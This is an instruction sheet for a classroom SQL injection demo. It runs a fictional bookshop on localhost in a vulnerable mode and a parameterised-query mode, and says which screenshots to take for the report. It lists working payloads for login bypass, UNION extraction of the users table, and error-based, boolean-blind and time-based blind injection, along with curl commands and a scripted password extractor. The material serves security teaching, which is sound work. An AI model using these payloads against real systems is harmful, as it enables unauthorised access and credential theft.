# Instructions — Running the Demo and Capturing the Screenshots

This file tells you **exactly** how to set up, run, and demonstrate the SQL
injection assignment, and **which screenshots to take** for the report
(`README.md`).

Everything runs on your own machine (`localhost`). The database is fictional and
is rebuilt in memory every time the server starts, so nothing you do causes
lasting damage, and nothing here touches any real or third-party system.

---

## 0. What you are about to build and show

You will run **one application** that can start in either of two modes, chosen
by an environment variable:

| Mode | Command | Banner | What happens to the attacks |
|------|---------|--------|-----------------------------|
| **Vulnerable** | `npm run start:vulnerable` | 🔴 red | They **work** |
| **Protected** | `npm run start:protected` | 🟢 green | They **fail** |

The same bookshop — **DrukShelf** — runs at <http://localhost:3000> in both
modes. The only thing that changes is whether its SQL is built by string
concatenation (vulnerable) or with parameterised queries (protected).

> **Why one app, two modes?** It makes the comparison fair: the report shows the
> *same* attack succeeding against the vulnerable build and being blocked by the
> protected build, with nothing else changed.

---

## 1. Environment / setup requirements

- **Node.js 20 or newer** — check with `node --version`.
- **A modern browser** — Chrome or Edge (DevTools screenshots assume Chrome).
- **Windows PowerShell** (the commands below are PowerShell; they work the same
  in any terminal). `curl.exe` ships with Windows 10/11.

---

## 2. Installation

Open a terminal in the `Assignment_3` folder and install dependencies once:

```powershell
npm install
```

This installs `express`, `sql.js` (SQLite compiled to WebAssembly — no native
build needed), `cookie-parser`, and `cross-env`.

---

## 3. How to start the application

You need **one terminal** for the app. For the automated-extraction demo
(Section 8) you will open a **second** terminal.

### The vulnerable version (for Parts A and B)

```powershell
npm run start:vulnerable
```

You should see `DrukShelf running at http://localhost:3000` and
`SQL-injection protection: OFF (vulnerable)`.

### The protected version (for Part C)

Stop the vulnerable server first (**Ctrl + C**), then:

```powershell
npm run start:protected
```

You should see `SQL-injection protection: ON (protected)`.

> You can only run one at a time on port 3000. Always **Ctrl + C** the old one
> before starting the other.

---

## 4. How to access the application

1. Open **<http://localhost:3000>** in your browser.
2. You land on the **catalogue** with a search box. The banner at the top right
   shows the current mode (red = vulnerable, green = protected).
3. Try a normal search such as `clean` — you get *Clean Code*, and below it the
   **"SQL sent to the database"** panel shows the exact query that ran.
4. The **Staff login** link (top right) opens the login form used for the
   authentication-bypass demo.

**Reference data** (seeded in `src/db.js`, for checking the attacks worked):

| username | password | role |
|----------|----------|------|
| admin | `Dr#k_R00t_2024!` | administrator |
| yeshi | `summer2023` | staff |
| norbu | `bhutan123` | customer |
| sonam | `p@ssw0rd` | customer |

---

> **Shortcut — the Attack Lab.** Both the catalogue and the login page have a
> collapsible **Attack Lab** panel with one-click buttons for every payload
> below. For the fastest demo you can just click those buttons instead of typing
> anything. The payloads are still listed here so you understand what each
> button does (and can reproduce them with `curl` for the report).

## 5. The attack payloads (copy-paste)

| # | Where | Paste this |
|---|-------|-----------|
| 9.1 Auth bypass | Login → **Username** box (password = anything) | `' OR 1=1-- ` |
| 9.1 Auth bypass (targeted) | Login → **Username** box | `admin'-- ` |
| 9.2 UNION dump | Catalogue **search** box | `zzz' UNION SELECT id, username, password, email, role FROM users-- ` |
| 9.3 Error-based | Catalogue **search** box | `'` |
| 9.4 Boolean blind (true) | Catalogue **search** box | `zzzzz' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='D'-- ` |
| 9.4 Boolean blind (false) | Catalogue **search** box | `zzzzz' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='Z'-- ` |

> **Important:** keep the **trailing space** after `-- ` (SQL line comments need
> a space after the dashes). When typing in the browser box the space is easy to
> miss; copy-pasting is safest.

---

## 6. How to perform the controlled demonstration (vulnerable mode)

Make sure Terminal A is running `npm run start:vulnerable`.

1. **Authentication bypass.** Open **Staff login**. In the username box paste
   `' OR 1=1-- `, type anything as the password, and sign in. You are
   authenticated as **admin (administrator)**, and the SQL panel shows why.
2. **UNION dump.** On the catalogue, paste the UNION payload into the search
   box. The results table fills with every user's **username, plaintext
   password, email and role** — the private table leaked through the public
   search.
3. **Error-based.** Search for a single `'`. The page shows a red
   *"database error"* box containing `unrecognized token: "' ORDER BY id"`.
4. **Boolean blind.** Search the "true" payload (`='D'`) → the whole catalogue
   (8 rows) appears. Search the "false" payload (`='Z'`) → *"No books matched"*.
   The password's first letter is therefore `D`, learned with no data shown.

---

## 7. How to demonstrate time-based blind injection

Run these in PowerShell against the **vulnerable** server and compare the times:

```powershell
# TRUE branch — a heavy hash runs, so the response is slow (~2 s)
curl.exe -s -G -o NUL -w "TRUE  -> %{time_total}s`n" http://localhost:3000/catalog --data-urlencode "q=zzz' OR CASE WHEN (SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin')>64 THEN like('A',upper(hex(randomblob(20000000)))) ELSE 0 END-- "

# FALSE branch — the hash is skipped, so the response is instant (~0.004 s)
curl.exe -s -G -o NUL -w "FALSE -> %{time_total}s`n" http://localhost:3000/catalog --data-urlencode "q=zzz' OR CASE WHEN (SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin')>200 THEN like('A',upper(hex(randomblob(20000000)))) ELSE 0 END-- "
```

The ~2-second gap is the signal an attacker reads instead of looking at the page.
(If 2 s is too long or too short on your machine, change `20000000` up or down.)

---

## 8. How to run the automated blind extractor

With the **vulnerable** server running in Terminal A, open **Terminal B** in the
same folder and run:

```powershell
npm run attack:extract
```

It prints the recovered admin password (`Dr#k_R00t_2024!`) and the number of
requests it took — proving the whole database is readable even though no page
ever displays the password.

Then switch Terminal A to `npm run start:protected` and run `npm run attack:extract`
again: it now reports that the injection no longer works.

---

## 9. How to verify the protected version

1. **Ctrl + C** the vulnerable server; start `npm run start:protected` (green
   banner).
2. **Legitimate use still works:** search `clean` → *Clean Code*; log in with
   `yeshi` / `summer2023` → authenticated as staff.
3. **Every attack now fails:** repeat the payloads from Section 5 —
   - UNION payload → *"No books matched"* (it is searched as a literal title).
   - `' OR 1=1-- ` login → *"Invalid username or password."*
   - `'` search → returns *The Web Application Hacker's Handbook* (its title
     contains an apostrophe) with **no error**.
   - `npm run attack:extract` → reports *"PROTECTED mode"*.

   In each case the green SQL panel shows the query and the **bound parameter**
   as two separate things.

---

## 10. Screenshots to take

Save every screenshot in the **`screenshots/`** folder using the **exact file
name** given. The README already links to these names, so each image appears in
the report as soon as you save it.

> **How to screenshot on Windows:** press **Win + Shift + S**, select the area,
> then paste into Paint (or the Snipping Tool) and save as PNG. Keep the browser
> at 100% zoom.

### Part A — The vulnerable application (`start:vulnerable`)

| # | File name | What to have on screen | What it should show |
|---|-----------|------------------------|---------------------|
| 1 | `01-vulnerable-catalog.png` | Catalogue after searching `clean`. | **Red** banner, *Clean Code* in the results. |
| 2 | `02-vulnerable-search-sql.png` | Same page, scrolled to the **red "SQL sent to the database"** panel. | The term `clean` sitting **inside** the concatenated query text. |

### Part B — The attacks (vulnerable app)

| # | File name | What to have on screen | What it should show |
|---|-----------|------------------------|---------------------|
| 3 | `03-auth-bypass.png` | Login page after submitting `' OR 1=1-- `. | Green *"Authenticated as admin (administrator)"* + the injected SQL, "matched 4 rows". |
| 4 | `04-union-dump.png` | Catalogue after the UNION payload. | Results table full of usernames + **plaintext passwords** + emails + roles. |
| 5 | `05-error-based.png` | Catalogue after searching `'`. | Red *"database error … unrecognized token"* box. |
| 6 | `06-boolean-blind.png` | Catalogue after the "true" blind payload (`='D'`). | 8 rows returned (true), next to / compared with the "false" payload showing *No books matched*. |
| 7 | `07-blind-extractor.png` | Terminal B after `npm run attack:extract`. | *"Recovered password for 'admin': Dr#k_R00t_2024!"* and the request count. |
| 8 | `08-time-based.png` | PowerShell after the two Section 7 commands. | `TRUE -> ~2s` vs `FALSE -> ~0.004s`. |

### Part C — The protected application (`start:protected`)

| # | File name | What to have on screen | What it should show |
|---|-----------|------------------------|---------------------|
| 9 | `09-protected-search-sql.png` | Protected catalogue after searching `clean`, scrolled to the **green** SQL panel. | The fixed `?`-placeholder query **plus** the separately bound parameter `$1 = "clean"`. |
| 10 | `10-protected-union-blocked.png` | Protected catalogue after the UNION payload. | *"No books matched"* — the payload is searched as a literal title. |
| 11 | `11-protected-auth-blocked.png` | Protected login after `' OR 1=1-- `. | *"Invalid username or password."* |
| 12 | `12-protected-legit.png` | Protected app: legit login (`yeshi`/`summer2023`) or legit search (`clean`). | Normal success — the fix does not break real use. |
| 13 | `13-protected-extractor-blocked.png` | Terminal after `npm run attack:extract` against the protected server. | *"Injection does not appear to work … PROTECTED mode."* |

---

## 11. Where each screenshot goes in README.md

| Screenshot | README section |
|------------|----------------|
| `01`, `02` | §8 Vulnerable Implementation |
| `03` | §9.1 Authentication bypass |
| `04` | §9.2 UNION-based extraction |
| `05` | §9.3 Error-based disclosure |
| `06` | §9.4 Boolean-based blind |
| `07` | §9.6 Automated blind extraction |
| `08` | §9.5 Time-based blind |
| `09` | §11 Parameterised-Query Implementation |
| `10`–`13` | §15 Results |

Once you drop the PNGs into `screenshots/` with the exact names, the report is
complete.

---

## 12. Shutting down

Press **Ctrl + C** in each terminal. Because the database is in memory,
everything resets the next time you start the app.
